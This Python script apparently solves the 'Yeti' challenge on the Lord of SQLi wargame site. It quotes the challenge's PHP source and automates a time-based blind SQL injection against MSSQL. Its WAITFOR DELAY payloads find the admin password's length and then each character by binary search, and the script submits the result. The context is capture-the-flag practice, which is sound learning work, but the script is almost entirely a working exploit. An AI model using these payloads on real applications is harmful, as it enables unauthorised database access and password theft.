#!/usr/bin/env python3
import los


def check_func(*args) -> bool:
    '''
    check time for request
    args[2]: time before request
    args[1]: time after request
    '''
    return args[2] - args[1] > 4


def main():
    '''
    Yeti 43

    Time-based Blind injection

    if(preg_match('/master|sys|information|;/i', $_GET['id'])) exit("No Hack ~_~");
    if(preg_match('/master|sys|information|;/i', $_GET['pw'])) exit("No Hack ~_~");
    $query = "select id from prob_yeti where id='{$_GET['id']}' and pw='{$_GET['pw']}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    sqlsrv_query($db,$query);

    $query = "select pw from prob_yeti where id='admin'"; 
    $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
    if($result['pw'] === $_GET['pw']) solve("yeti");
    '''

    url = "https://los.rubiya.kr/chall/yeti_e6afc70b892148ced2d1e063c1230255.php"
    cook = los.check_cookies(url)

    final_response = ''
    while 'Clear!' not in final_response:

        payload = "' if ((select len(pw) from prob_yeti where id='admin')>%s) WAITFOR DELAY '0:0:5' else WAITFOR DELAY '0:0:0'-- "
        param = dict(pw=payload)
        len_of_key = los.find_key_len(url, param, check_func, cook)

        print(len_of_key)

        result = ''
        num_of_requests = 0
        for i in range(1, len_of_key + 1):
            payload = f"' if(unicode(substring((select pw from prob_yeti where id='admin'),{i},1))<%s) WAITFOR DELAY '0:0:5' else WAITFOR DELAY '0:0:0'-- "
            param = dict(pw=payload)
            left, num_requests = los.find_binary(url, param, check_func,
                                                 32, 127, cook)
            print(chr(left))
            result += chr(left)
            num_of_requests += num_requests

        print('num_of_requests:', num_of_requests)

        param = {'id': 'admin', 'pw': result}
        final_response = los.get_request(url, param, cook)

    print('Yety Clear!')


if __name__ == '__main__':
    main()
